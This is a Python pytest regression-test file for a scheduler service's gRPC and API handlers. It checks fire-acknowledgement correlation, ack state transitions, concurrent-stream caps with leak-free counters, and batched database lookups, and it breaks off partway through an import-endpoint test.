"""Regression tests for the second-round Apr 2026 brain audit.

Pins the I-1 IDOR fix, the WatchSchedules connection cap, the N+1
batch-loading fixes, and the audit-on-denial middleware behavior
introduced in the deep-audit follow-up batch.
"""

from __future__ import annotations

import asyncio
import secrets
import uuid
from collections import defaultdict
from datetime import UTC, datetime
from types import MethodType, SimpleNamespace
from unittest.mock import AsyncMock, MagicMock

import pytest


def _cadence_fire_id() -> uuid.UUID:
    """A version-5 (uuid5) fire id, matching a real CADENCE fire (derive_fire_id).
    Detects a manual trigger by the uuid4 (version-4) shape, so cadence
    tests must use a version-5 id to exercise the anchor-advancing path."""
    return uuid.uuid5(uuid.NAMESPACE_OID, str(uuid.uuid4()))


# =====================================================================
# I-1: AcknowledgeFireResult correlation goes through schedule_fires
# =====================================================================


class TestI1AckCorrelationByScheduleFires:
    """Pre-fix: ack lookup used ``Schedule.last_fire_id`` (a moving
    target overwritten on every fire). Two back-to-back in-flight
    fires raced - the second fire's FireSchedule overwrote
    last_fire_id BEFORE the first ack landed, and the first ack
    silently no-op'd or hit the wrong row.

    Post-fix: ack lookup joins ``schedule_fires.fire_id`` (UNIQUE).
    Lookup is unambiguous and idempotent across concurrent fires.
    """

    @pytest.mark.asyncio
    async def test_ack_resolves_via_schedule_fires_join(self) -> None:
        from sqlalchemy.ext.asyncio import create_async_engine
        from sqlalchemy.pool import StaticPool
        from z4j_brain.persistence.base import Base
        from z4j_brain.persistence.database import DatabaseManager
        from z4j_brain.persistence.enums import ScheduleKind
        from z4j_brain.persistence.models import (
            Project,
            Schedule,
            ScheduleFire,
        )
        from z4j_brain.scheduler_grpc.handlers import SchedulerServiceImpl
        from z4j_brain.scheduler_grpc.proto import scheduler_pb2 as pb
        from z4j_brain.settings import Settings

        engine = create_async_engine(
            "sqlite+aiosqlite:///:memory:",
            poolclass=StaticPool,
            connect_args={"check_same_thread": False},
        )
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        try:
            db = DatabaseManager(engine)
            settings = Settings(
                database_url="sqlite+aiosqlite:///:memory:",
                secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                session_secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                environment="dev",
                log_json=False,
            )

            project_id = uuid.uuid4()
            schedule_id_a = uuid.uuid4()
            schedule_id_b = uuid.uuid4()
            fire_id_a = _cadence_fire_id()
            fire_id_b = _cadence_fire_id()

            async with db.session() as s:
                s.add(Project(id=project_id, slug="proj", name="Proj"))
                # Schedule A: most recent FireSchedule was fire_id_b
                # (overwriting fire_id_a's pointer). Pre-fix, an ack
                # for fire_id_a would silently no-op because
                # last_fire_id no longer == fire_id_a.
                s.add(
                    Schedule(
                        id=schedule_id_a,
                        project_id=project_id,
                        engine="celery",
                        scheduler="z4j-scheduler",
                        name="A",
                        task_name="t.t",
                        kind=ScheduleKind.CRON,
                        expression="0 * * * *",
                        timezone="UTC",
                        args=[],
                        kwargs={},
                        is_enabled=True,
                        last_fire_id=fire_id_b,  # B overwrote A
                        total_runs=0,
                    )
                )
                s.add(
                    Schedule(
                        id=schedule_id_b,
                        project_id=project_id,
                        engine="celery",
                        scheduler="z4j-scheduler",
                        name="B",
                        task_name="t.t",
                        kind=ScheduleKind.CRON,
                        expression="0 * * * *",
                        timezone="UTC",
                        args=[],
                        kwargs={},
                        is_enabled=True,
                        last_fire_id=fire_id_b,
                        total_runs=0,
                    )
                )
                # Both fires recorded in schedule_fires (the
                # authoritative table). Post-fix the ack lookup
                # joins on schedule_fires.fire_id so it correctly
                # routes the ack to schedule A even though A's
                # last_fire_id has been overwritten.
                now = datetime.now(UTC)
                s.add(
                    ScheduleFire(
                        fire_id=fire_id_a,
                        schedule_id=schedule_id_a,
                        project_id=project_id,
                        command_id=None,
                        status="delivered",
                        scheduled_for=now,
                        fired_at=now,
                    )
                )
                s.add(
                    ScheduleFire(
                        fire_id=fire_id_b,
                        schedule_id=schedule_id_b,
                        project_id=project_id,
                        command_id=None,
                        status="delivered",
                        scheduled_for=now,
                        fired_at=now,
                    )
                )
                await s.commit()

            servicer = SchedulerServiceImpl(
                settings=settings,
                db=db,
                command_dispatcher=None,  # type: ignore[arg-type]
                audit_service=None,  # type: ignore[arg-type]
            )

            # Mock context with a no-op auth_context (no binding
            # restrictions in this Settings).
            ctx = MagicMock()
            ctx.auth_context.return_value = {}

            # Ack fire_id_a. Pre-fix this would silently no-op
            # because Schedule A's last_fire_id was overwritten
            # by B. Post-fix the join finds Schedule A via
            # schedule_fires and updates its last_run_at.
            request = pb.AcknowledgeFireResultRequest(
                fire_id=str(fire_id_a),
                status="success",
            )
            await servicer.AcknowledgeFireResult(request, ctx)

            # Verify Schedule A was updated, NOT Schedule B.
            from sqlalchemy import select

            async with db.session() as s:
                result = await s.execute(
                    select(Schedule).where(Schedule.id == schedule_id_a),
                )
                a = result.scalar_one()
                result = await s.execute(
                    select(Schedule).where(Schedule.id == schedule_id_b),
                )
                b = result.scalar_one()

            assert a.last_run_at is not None, (
                "ack for fire_id_a should update Schedule A's "
                "last_run_at via schedule_fires join (not via "
                "Schedule.last_fire_id which was overwritten by B)"
            )
            assert a.total_runs == 1
            # Schedule B was untouched - the ack for fire_id_a did
            # not accidentally land on B.
            assert b.last_run_at is None, (
                "ack for fire_id_a must not touch Schedule B even "
                "though B's last_fire_id == fire_id_b matches a "
                "completely different fire"
            )
        finally:
            await engine.dispose()


# =====================================================================
# A FAILED ack must not advance last_run_at (retry re-fires slot)
# =====================================================================


class TestFailedAckDoesNotAdvanceLastRun:
    """A failed fire (no task delivered) is retried by the
    scheduler on the SAME slot after its dispatch back-off; next_fire_at is
    deliberately left unchanged there. If the failed ack advanced
    ``last_run_at`` to the failure wall-time, the schedules_notify trigger
    echoes it back as the schedule's anchor (WatchSchedules UPDATED), moving
    the anchor PAST the slot the scheduler is about to re-fire, so the retry's
    catch-up drain skips the slot as already-run and the failed fire is never
    dispatched again.

    Post-fix: last_run_at + total_runs advance ONLY on ``status="success"``.
    The failure is still recorded on the schedule_fires row (acked_failed),
    the audit trail, and the fire.failed notification.
    """

    @pytest.mark.asyncio
    async def test_failed_ack_leaves_last_run_and_total_runs_untouched(self) -> None:
        from sqlalchemy import select
        from sqlalchemy.ext.asyncio import create_async_engine
        from sqlalchemy.pool import StaticPool
        from z4j_brain.persistence.base import Base
        from z4j_brain.persistence.database import DatabaseManager
        from z4j_brain.persistence.enums import ScheduleKind
        from z4j_brain.persistence.models import (
            Project,
            Schedule,
            ScheduleFire,
        )
        from z4j_brain.scheduler_grpc.handlers import SchedulerServiceImpl
        from z4j_brain.scheduler_grpc.proto import scheduler_pb2 as pb
        from z4j_brain.settings import Settings

        engine = create_async_engine(
            "sqlite+aiosqlite:///:memory:",
            poolclass=StaticPool,
            connect_args={"check_same_thread": False},
        )
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        try:
            db = DatabaseManager(engine)
            settings = Settings(
                database_url="sqlite+aiosqlite:///:memory:",
                secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                session_secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                environment="dev",
                log_json=False,
            )

            project_id = uuid.uuid4()
            schedule_id = uuid.uuid4()
            fire_id = _cadence_fire_id()

            async with db.session() as s:
                s.add(Project(id=project_id, slug="proj", name="Proj"))
                s.add(
                    Schedule(
                        id=schedule_id,
                        project_id=project_id,
                        engine="celery",
                        scheduler="z4j-scheduler",
                        name="A",
                        task_name="t.t",
                        kind=ScheduleKind.CRON,
                        expression="0 * * * *",
                        timezone="UTC",
                        args=[],
                        kwargs={},
                        is_enabled=True,
                        last_fire_id=fire_id,
                        last_run_at=None,
                        total_runs=0,
                    )
                )
                now = datetime.now(UTC)
                s.add(
                    ScheduleFire(
                        fire_id=fire_id,
                        schedule_id=schedule_id,
                        project_id=project_id,
                        command_id=None,
                        status="delivered",
                        scheduled_for=now,
                        fired_at=now,
                    )
                )
                await s.commit()

            # Capture the seeded updated_at so H7 can assert the failed ack does
            # not touch the schedules row (which would fire the notify echo).
            async with db.session() as s:
                seed_updated_at = (
                    (await s.execute(select(Schedule).where(Schedule.id == schedule_id)))
                    .scalar_one()
                    .updated_at
                )

            servicer = SchedulerServiceImpl(
                settings=settings,
                db=db,
                command_dispatcher=None,  # type: ignore[arg-type]
                audit_service=None,  # type: ignore[arg-type]
            )
            ctx = MagicMock()
            ctx.auth_context.return_value = {}

            request = pb.AcknowledgeFireResultRequest(
                fire_id=str(fire_id),
                status="failed",
                error="agent unreachable",
            )
            await servicer.AcknowledgeFireResult(request, ctx)

            async with db.session() as s:
                sched = (
                    await s.execute(select(Schedule).where(Schedule.id == schedule_id))
                ).scalar_one()
                fire = (
                    await s.execute(select(ScheduleFire).where(ScheduleFire.fire_id == fire_id))
                ).scalar_one()

            # The slot's anchor must not move: the scheduler will re-fire it.
            assert sched.last_run_at is None, (
                "a FAILED ack must NOT advance last_run_at -- the scheduler "
                "retries the same slot and the advanced anchor would skip it"
            )
            assert sched.total_runs == 0, "a FAILED fire is not a completed run"
            # But the failure IS recorded on the per-fire row.
            assert fire.status == "acked_failed"
            # A failed ack must NOT touch the schedules row at all -- not
            # even updated_at -- so the schedules_notify trigger emits no echo
            # that would re-anchor the slot the scheduler is about to retry.
            assert sched.updated_at == seed_updated_at
        finally:
            await engine.dispose()

    async def test_failed_then_success_ack_advances_exactly_once_r5_h5(self) -> None:
        # A fire that is acked FAILED (dispatch-failure) and later acked
        # SUCCESS on its RETRY (same fire_id) must advance last_run_at +
        # total_runs -- exactly once. The old was_first_ack gate dropped it (the
        # failed ack consumed the first-ack). A duplicate success ack must not
        # double-count.
        from sqlalchemy import select
        from sqlalchemy.ext.asyncio import create_async_engine
        from sqlalchemy.pool import StaticPool
        from z4j_brain.persistence.base import Base
        from z4j_brain.persistence.database import DatabaseManager
        from z4j_brain.persistence.enums import ScheduleKind
        from z4j_brain.persistence.models import Project, Schedule, ScheduleFire
        from z4j_brain.scheduler_grpc.handlers import SchedulerServiceImpl
        from z4j_brain.scheduler_grpc.proto import scheduler_pb2 as pb
        from z4j_brain.settings import Settings

        engine = create_async_engine(
            "sqlite+aiosqlite:///:memory:",
            poolclass=StaticPool,
            connect_args={"check_same_thread": False},
        )
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        try:
            db = DatabaseManager(engine)
            settings = Settings(
                database_url="sqlite+aiosqlite:///:memory:",
                secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                session_secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                environment="dev",
                log_json=False,
            )
            project_id = uuid.uuid4()
            schedule_id = uuid.uuid4()
            fire_id = _cadence_fire_id()
            async with db.session() as s:
                s.add(Project(id=project_id, slug="proj", name="Proj"))
                s.add(
                    Schedule(
                        id=schedule_id,
                        project_id=project_id,
                        engine="celery",
                        scheduler="z4j-scheduler",
                        name="A",
                        task_name="t.t",
                        kind=ScheduleKind.CRON,
                        expression="0 * * * *",
                        timezone="UTC",
                        args=[],
                        kwargs={},
                        is_enabled=True,
                        last_fire_id=fire_id,
                        last_run_at=None,
                        total_runs=0,
                    )
                )
                now = datetime.now(UTC)
                s.add(
                    ScheduleFire(
                        fire_id=fire_id,
                        schedule_id=schedule_id,
                        project_id=project_id,
                        command_id=None,
                        status="delivered",
                        scheduled_for=now,
                        fired_at=now,
                    )
                )
                await s.commit()

            servicer = SchedulerServiceImpl(
                settings=settings,
                db=db,
                command_dispatcher=None,  # type: ignore[arg-type]
                audit_service=None,  # type: ignore[arg-type]
            )
            ctx = MagicMock()
            ctx.auth_context.return_value = {}

            async def _ack(status: str) -> None:
                await servicer.AcknowledgeFireResult(
                    pb.AcknowledgeFireResultRequest(fire_id=str(fire_id), status=status),
                    ctx,
                )

            await _ack("failed")  # first attempt fails
            await _ack("success")  # retry of the SAME fire succeeds
            await _ack("success")  # duplicate success ack

            async with db.session() as s:
                sched = (
                    await s.execute(select(Schedule).where(Schedule.id == schedule_id))
                ).scalar_one()
                fire = (
                    await s.execute(select(ScheduleFire).where(ScheduleFire.fire_id == fire_id))
                ).scalar_one()
            assert sched.last_run_at is not None, (
                "the success retry must advance last_run_at even though a failed "
                "ack already consumed the first-ack"
            )
            assert sched.total_runs == 1, "advanced exactly once (no double-count)"
            assert fire.status == "acked_success"
        finally:
            await engine.dispose()


class TestAckStateMachineR6:
    """/RM3/RL1: the ack state machine. last_run_at anchors on the
    fire's logical scheduled_for (not the ack wall-time); a manual trigger does
    not advance the cadence anchor; status is terminal-preferring toward success;
    a success transition clears the stale failure detail."""

    async def _bootstrap(self, *, scheduled_for, triggered_by=None, fire_id=None):
        import secrets as _secrets

        from sqlalchemy.ext.asyncio import create_async_engine
        from sqlalchemy.pool import StaticPool
        from z4j_brain.persistence.base import Base
        from z4j_brain.persistence.database import DatabaseManager
        from z4j_brain.persistence.enums import ScheduleKind
        from z4j_brain.persistence.models import Project, Schedule, ScheduleFire, User
        from z4j_brain.scheduler_grpc.handlers import SchedulerServiceImpl
        from z4j_brain.settings import Settings

        engine = create_async_engine(
            "sqlite+aiosqlite:///:memory:",
            poolclass=StaticPool,
            connect_args={"check_same_thread": False},
        )
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        db = DatabaseManager(engine)
        settings = Settings(
            database_url="sqlite+aiosqlite:///:memory:",
            secret=_secrets.token_urlsafe(48),  # type: ignore[arg-type]
            session_secret=_secrets.token_urlsafe(48),  # type: ignore[arg-type]
            environment="dev",
            log_json=False,
        )
        project_id, schedule_id = uuid.uuid4(), uuid.uuid4()
        fire_id = fire_id if fire_id is not None else _cadence_fire_id()
        async with db.session() as s:
            s.add(Project(id=project_id, slug="proj", name="Proj"))
            if triggered_by is not None:
                s.add(
                    User(
                        id=triggered_by,
                        email=f"manual-{triggered_by}@example.com",
                        password_hash="unused-test-hash",
                        is_active=True,
                    )
                )
            await s.flush()
            s.add(
                Schedule(
                    id=schedule_id,
                    project_id=project_id,
                    engine="celery",
                    scheduler="z4j-scheduler",
                    name="A",
                    task_name="t.t",
                    kind=ScheduleKind.CRON,
                    expression="0 * * * *",
                    timezone="UTC",
                    args=[],
                    kwargs={},
                    is_enabled=True,
                    last_fire_id=fire_id,
                    last_run_at=None,
                    total_runs=0,
                )
            )
            await s.flush()
            s.add(
                ScheduleFire(
                    fire_id=fire_id,
                    schedule_id=schedule_id,
                    project_id=project_id,
                    command_id=None,
                    status="delivered",
                    scheduled_for=scheduled_for,
                    fired_at=scheduled_for,
                    triggered_by_user_id=triggered_by,
                )
            )
            await s.commit()
        servicer = SchedulerServiceImpl(
            settings=settings,
            db=db,
            command_dispatcher=None,  # type: ignore[arg-type]
            audit_service=None,  # type: ignore[arg-type]
        )
        ctx = MagicMock()
        ctx.auth_context.return_value = {}
        return engine, db, servicer, ctx, schedule_id, fire_id

    async def _ack(self, servicer, ctx, fire_id, status, error=""):
        from z4j_brain.scheduler_grpc.proto import scheduler_pb2 as pb

        await servicer.AcknowledgeFireResult(
            pb.AcknowledgeFireResultRequest(fire_id=str(fire_id), status=status, error=error),
            ctx,
        )

    async def _get(self, db, model, **where):
        from sqlalchemy import select

        col, val = next(iter(where.items()))
        async with db.session() as s:
            return (await s.execute(select(model).where(getattr(model, col) == val))).scalar_one()

    async def test_success_anchors_on_scheduled_for_not_wall_time_r6_h5(self) -> None:
        from z4j_brain.persistence.models import Schedule

        slot = datetime(2026, 5, 1, 12, 0, tzinfo=UTC)  # the logical fire slot
        engine, db, servicer, ctx, sid, fid = await self._bootstrap(scheduled_for=slot)
        try:
            await self._ack(servicer, ctx, fid, "success")
            sched = await self._get(db, Schedule, id=sid)
            # RH5: last_run_at is the LOGICAL slot, not now() -- so a cold restart
            # re-anchors drift-free.
            assert sched.last_run_at is not None
            assert sched.last_run_at.replace(tzinfo=None) == slot.replace(tzinfo=None)
            assert sched.total_runs == 1
        finally:
            await engine.dispose()

    async def test_manual_trigger_does_not_advance_cadence_r6_h6(self) -> None:
        from z4j_brain.persistence.models import Schedule

        slot = datetime(2026, 5, 1, 12, 0, tzinfo=UTC)
        engine, db, servicer, ctx, sid, fid = await self._bootstrap(
            scheduled_for=slot,
            triggered_by=uuid.uuid4(),  # a manual "Trigger Now"
        )
        try:
            await self._ack(servicer, ctx, fid, "success")
            sched = await self._get(db, Schedule, id=sid)
            # RH6: a manual trigger must NOT advance the cadence anchor (else a
            # future one_shot/clocked looks completed and never fires) ...
            assert sched.last_run_at is None
            # but: it IS a real run, so total_runs still counts it.
            assert sched.total_runs == 1
        finally:
            await engine.dispose()

    async def test_manual_detected_by_fire_id_version_when_attribution_nulled_r7_p1_8(
        self,
    ) -> None:
        from z4j_brain.persistence.models import Schedule

        slot = datetime(2026, 5, 1, 12, 0, tzinfo=UTC)
        # A manual trigger whose user attribution was NULLED (a global-admin /
        # non-member trigger). fire_id is uuid4 (version 4, the manual shape);
        # triggered_by is None. must still detect it as manual.
        engine, db, servicer, ctx, sid, _fid = await self._bootstrap(
            scheduled_for=slot, triggered_by=None, fire_id=uuid.uuid4()
        )
        try:
            await self._ack(servicer, ctx, _fid, "success")
            sched = await self._get(db, Schedule, id=sid)
            assert sched.last_run_at is None  # cadence anchor NOT advanced
            assert sched.total_runs == 1  # but the run is counted
        finally:
            await engine.dispose()

    async def test_late_earlier_slot_ack_does_not_regress_last_run_r7_p2_2(self) -> None:
        from sqlalchemy import select
        from z4j_brain.persistence.models import Schedule, ScheduleFire

        # Two cadence fires: a LATER slot acked first, then an EARLIER slot's ack
        # arrives late. last_run_at must be monotonic (not regress to the earlier
        # slot), while total_runs counts both.
        early = datetime(2026, 5, 1, 12, 0, tzinfo=UTC)
        late = datetime(2026, 5, 1, 13, 0, tzinfo=UTC)
        engine, db, servicer, ctx, sid, fid_late = await self._bootstrap(scheduled_for=late)
        try:
            fid_early = _cadence_fire_id()
            async with db.session() as s:
                sched = (await s.execute(select(Schedule).where(Schedule.id == sid))).scalar_one()
                s.add(
                    ScheduleFire(
                        fire_id=fid_early,
                        schedule_id=sid,
                        project_id=sched.project_id,
                        command_id=None,
                        status="delivered",
                        scheduled_for=early,
                        fired_at=early,
                    )
                )
                await s.commit()
            await self._ack(servicer, ctx, fid_late, "success")  # later slot first
            await self._ack(servicer, ctx, fid_early, "success")  # earlier, late
            sched = await self._get(db, Schedule, id=sid)
            assert sched.last_run_at.replace(tzinfo=None) == late.replace(tzinfo=None)
            assert sched.total_runs == 2  # both counted, anchor did not regress
        finally:
            await engine.dispose()

    async def test_late_failed_ack_does_not_downgrade_success_r6_m3(self) -> None:
        from z4j_brain.persistence.models import Schedule, ScheduleFire

        slot = datetime(2026, 5, 1, 12, 0, tzinfo=UTC)
        engine, db, servicer, ctx, sid, fid = await self._bootstrap(scheduled_for=slot)
        try:
            await self._ack(servicer, ctx, fid, "success")
            await self._ack(servicer, ctx, fid, "failed", error="late straggler")
            fire = await self._get(db, ScheduleFire, fire_id=fid)
            sched = await self._get(db, Schedule, id=sid)
            # RM3: never downgrade acked_success; total_runs stays 1.
            assert fire.status == "acked_success"
            assert fire.error_message is None  # RL1: cleared on the success
            assert sched.total_runs == 1
        finally:
            await engine.dispose()

    async def test_failed_then_success_clears_error_r6_l1(self) -> None:
        from z4j_brain.persistence.models import ScheduleFire

        slot = datetime(2026, 5, 1, 12, 0, tzinfo=UTC)
        engine, db, servicer, ctx, _sid, fid = await self._bootstrap(scheduled_for=slot)
        try:
            await self._ack(servicer, ctx, fid, "failed", error="agent offline")
            fire1 = await self._get(db, ScheduleFire, fire_id=fid)
            assert fire1.status == "acked_failed" and fire1.error_message
            await self._ack(servicer, ctx, fid, "success")
            fire2 = await self._get(db, ScheduleFire, fire_id=fid)
            # RL1: the recovery clears the stale failure detail.
            assert fire2.status == "acked_success"
            assert fire2.error_message is None
            assert fire2.error_code is None
        finally:
            await engine.dispose()


# =====================================================================
# WatchSchedules concurrency cap
# =====================================================================


class TestWatchSchedulesConcurrencyCap:
    """Pre-fix: every WatchSchedules RPC opened a fresh asyncpg
    LISTEN connection with no cap. A misbehaving scheduler that
    opened+dropped streams in a loop drained Postgres
    ``max_connections`` and killed brain's main pool. Post-fix:
    global semaphore + per-CN counter; new streams over the cap
    abort with RESOURCE_EXHAUSTED."""

    def test_settings_default_cap_sane(self) -> None:
        from z4j_brain.settings import Settings

        s = Settings(
            database_url="sqlite+aiosqlite:///:memory:",
            secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
            session_secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
            environment="dev",
            log_json=False,
        )
        # Defaults bounded by realistic fleet ceiling.
        assert s.scheduler_grpc_watch_max_concurrent == 64
        assert s.scheduler_grpc_watch_max_per_cert == 4

    def test_settings_below_min_rejected(self) -> None:
        """``ge=1`` floor on per-cert cap so an operator can't
        configure '0 streams allowed' which would 100% deny."""
        from pydantic import ValidationError as _PydanticValidationError
        from z4j_brain.settings import Settings

        with pytest.raises(_PydanticValidationError):
            Settings(
                database_url="sqlite+aiosqlite:///:memory:",
                secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                session_secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                environment="dev",
                log_json=False,
                scheduler_grpc_watch_max_per_cert=0,
            )


# =====================================================================
# Sched-H1: WatchSchedules counter-under-lock (no semaphore leak)
# =====================================================================


class _WatchAbortError(RuntimeError):
    pass


class _WatchContext:
    def __init__(self, cn: str) -> None:
        self.cn = cn
        self.status = None

    async def abort(self, status, message: str) -> None:
        self.status = status
        raise _WatchAbortError(message)

    def cancelled(self) -> bool:
        return False


def _watch_service(*, global_cap: int = 1, per_cert_cap: int = 4):
    from z4j_brain.scheduler_grpc.handlers import SchedulerServiceImpl

    service = object.__new__(SchedulerServiceImpl)
    service._settings = SimpleNamespace(
        scheduler_grpc_cn_project_bindings={},
        scheduler_grpc_watch_max_per_cert=per_cert_cap,
    )
    service._db = SimpleNamespace(
        engine=SimpleNamespace(dialect=SimpleNamespace(name="sqlite")),
    )
    service._watch_global_cap = global_cap
    service._watch_global_count = 0
    service._watch_global_lock = asyncio.Lock()
    service._watch_per_cert_count = defaultdict(int)
    service._watch_per_cert_lock = asyncio.Lock()
    return service


def _patch_watch_binding(monkeypatch: pytest.MonkeyPatch) -> None:
    from z4j_brain.scheduler_grpc import binding

    monkeypatch.setattr(binding, "extract_peer_cns", lambda context: {context.cn})
    monkeypatch.setattr(
        binding,
        "filter_project_ids_by_binding",
        AsyncMock(return_value=None),
    )


class TestWatchSchedulesCounterUnderLock:
    """Round-10 audit fix -Sched-H1 (Apr 2026).

    The fix replaced a racy ``locked()`` + ``acquire()``
    with ``asyncio.wait_for(sem.acquire(), 0)``, but
    ``wait_for(coro, 0)`` is documented as racy when ``coro``
    completes synchronously: the timer fires in the same tick, the
    task is cancelled AFTER it succeeded, the slot is decremented
    but the caller sees TimeoutError. Plus an acquire-then-cancel
    window between two non-adjacent try-blocks left the slot held
    on cancellation in the gap. Production observed the cap exhaust
    over hours from a single client's reconnect loop.

    Post-fix: counter under a single ``asyncio.Lock`` (atomic
    increment), shielded ``_release_watch_slot`` decrement
    (cancellation-safe), single try/finally over the whole stream
    body (no acquire-then-cancel gap).
    """

    @pytest.mark.asyncio
    async def test_global_rejection_and_stream_close_do_not_leak_slots(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        import grpc
        from z4j_brain.scheduler_grpc.proto import scheduler_pb2 as pb

        _patch_watch_binding(monkeypatch)
        service = _watch_service(global_cap=1, per_cert_cap=4)

        async def polling(_self, **_kwargs):
            yield pb.ScheduleEvent(resume_token="ready")

        service._watch_via_polling = MethodType(polling, service)
        first = service.WatchSchedules(pb.WatchSchedulesRequest(), _WatchContext("cert-a"))
        await anext(first)
        assert service._watch_global_count == 1
        assert service._watch_per_cert_count == {"cert-a": 1}

        rejected_context = _WatchContext("cert-b")
        rejected = service.WatchSchedules(pb.WatchSchedulesRequest(), rejected_context)
        with pytest.raises(_WatchAbortError, match="concurrent stream cap"):
            await anext(rejected)
        assert rejected_context.status is grpc.StatusCode.RESOURCE_EXHAUSTED
        assert service._watch_global_count == 1
        assert "cert-b" not in service._watch_per_cert_count

        await first.aclose()
        assert service._watch_global_count == 0
        assert dict(service._watch_per_cert_count) == {}

    @pytest.mark.asyncio
    async def test_per_cert_rejection_preserves_the_live_stream(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from z4j_brain.scheduler_grpc.proto import scheduler_pb2 as pb

        _patch_watch_binding(monkeypatch)
        service = _watch_service(global_cap=4, per_cert_cap=1)

        async def polling(_self, **_kwargs):
            yield pb.ScheduleEvent(resume_token="ready")

        service._watch_via_polling = MethodType(polling, service)
        first = service.WatchSchedules(pb.WatchSchedulesRequest(), _WatchContext("same-cert"))
        await anext(first)
        second = service.WatchSchedules(pb.WatchSchedulesRequest(), _WatchContext("same-cert"))
        with pytest.raises(_WatchAbortError, match="per-cert"):
            await anext(second)
        assert service._watch_global_count == 1
        assert service._watch_per_cert_count == {"same-cert": 1}
        await first.aclose()
        assert service._watch_global_count == 0

    @pytest.mark.asyncio
    async def test_cancelled_stream_eventually_releases_both_slots(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from z4j_brain.scheduler_grpc.proto import scheduler_pb2 as pb

        _patch_watch_binding(monkeypatch)
        service = _watch_service()
        entered = asyncio.Event()
        never = asyncio.Event()

        async def polling(_self, **_kwargs):
            entered.set()
            await never.wait()
            if False:  # pragma: no cover - makes this an async generator
                yield pb.ScheduleEvent()

        service._watch_via_polling = MethodType(polling, service)
        stream = service.WatchSchedules(pb.WatchSchedulesRequest(), _WatchContext("cancelled"))
        pending = asyncio.create_task(anext(stream))
        await asyncio.wait_for(entered.wait(), timeout=1)
        assert service._watch_global_count == 1
        pending.cancel()
        with pytest.raises(asyncio.CancelledError):
            await pending
        for _ in range(10):
            if service._watch_global_count == 0:
                break
            await asyncio.sleep(0)
        assert service._watch_global_count == 0
        assert dict(service._watch_per_cert_count) == {}

    @pytest.mark.asyncio
    async def test_release_helper_decrements_both_runtime_counters(self) -> None:
        service = _watch_service()
        service._watch_global_count = 1
        service._watch_per_cert_count["cert"] = 1

        await service._release_watch_slot("cert")

        assert service._watch_global_count == 0
        assert dict(service._watch_per_cert_count) == {}

    @pytest.mark.asyncio
    async def test_negative_counter_is_logged_and_reset(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from z4j_brain.scheduler_grpc import handlers

        service = _watch_service()
        service._watch_per_cert_count["cert"] = 1
        error = MagicMock()
        monkeypatch.setattr(handlers.logger, "error", error)
        await service._release_watch_slot("cert")
        assert service._watch_global_count == 0
        error.assert_called_once()
        assert "went negative" in error.call_args.args[0]

    def test_constructor_seeds_runtime_counters(self) -> None:
        from z4j_brain.scheduler_grpc.handlers import SchedulerServiceImpl
        from z4j_brain.settings import Settings

        settings = Settings(
            database_url="sqlite+aiosqlite:///:memory:",
            secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
            session_secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
            environment="dev",
            scheduler_grpc_watch_max_concurrent=3,
        )
        service = SchedulerServiceImpl(
            settings=settings,
            db=object(),  # type: ignore[arg-type]
            command_dispatcher=object(),  # type: ignore[arg-type]
            audit_service=object(),  # type: ignore[arg-type]
        )
        assert service._watch_global_cap == 3
        assert service._watch_global_count == 0
        assert dict(service._watch_per_cert_count) == {}


# =====================================================================
# N+1: import + diff endpoints batch their existing-row lookups
# =====================================================================


class TestN1BatchLookups:
    """Pre-fix: ``import_schedules`` failure-recovery path issued
    one SELECT per failed row; ``diff_schedules`` issued one SELECT
    per row. Post-fix: a single ``tuple_(scheduler, name).in_(...)``
    query loads the entire batch.

    These call the production handlers with large batches and count the
    session's actual execute calls.
    """

    @staticmethod
    def _body(count: int, *, mode: str):
        from z4j_brain.api.schedules import ImportSchedulesRequest

        return ImportSchedulesRequest(
            mode=mode,
            source_filter="declarative_django" if mode == "replace_for_source" else None,
            schedules=[
                {
                    "name": f"schedule-{index}",
                    "engine": "celery",
                    "kind": "cron",
                    "expression": "* * * * *",
                    "task_name": f"tasks.job_{index}",
                    "source": "declarative_django",
                }
                for index in range(count)
            ],
        )

    @pytest.mark.asyncio
    async def test_import_failure_recovery_uses_one_existing_row_query(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from starlette.requests import Request
        from z4j_brain.api import schedules as routes
        from z4j_brain.persistence import repositories
        from z4j_brain.persistence.repositories import ScheduleRepository

        count = 40
        ids = [uuid.uuid4() for _ in range(count)]
        lookup = SimpleNamespace(
            all=lambda: [
                ("z4j-scheduler", f"schedule-{index}", ids[index]) for index in range(count)
            ],
        )
        session = SimpleNamespace(
            execute=AsyncMock(return_value=lookup),
            commit=AsyncMock(),
        )
        project = SimpleNamespace(
            id=uuid.uuid4(),
            slug="batch",
            is_active=True,
            default_scheduler_owner="z4j-scheduler",
            allowed_schedulers=[],
        )
        projects = SimpleNamespace(get_by_slug=AsyncMock(return_value=project))
        user = SimpleNamespace(id=uuid.uuid4(), is_admin=True)
        audit = SimpleNamespace(record=AsyncMock())
        delete_batch = AsyncMock(return_value=0)
        monkeypatch.setattr(
            repositories,
            "upsert_imported_schedule",
            AsyncMock(side_effect=ValueError("invalid imported row")),
        )
        monkeypatch.setattr(ScheduleRepository, "delete_by_source_except", delete_batch)
        monkeypatch.setattr(
            routes,
            "_acquire_replace_for_source_lock",
            AsyncMock(return_value=False),
        )
        request = Request(
            {
                "type": "http",
                "method": "POST",
                "path": "/api/v1/projects/batch/schedules:import",
                "headers": [],
            },
        )

        response = await routes.import_schedules(
            slug="batch",
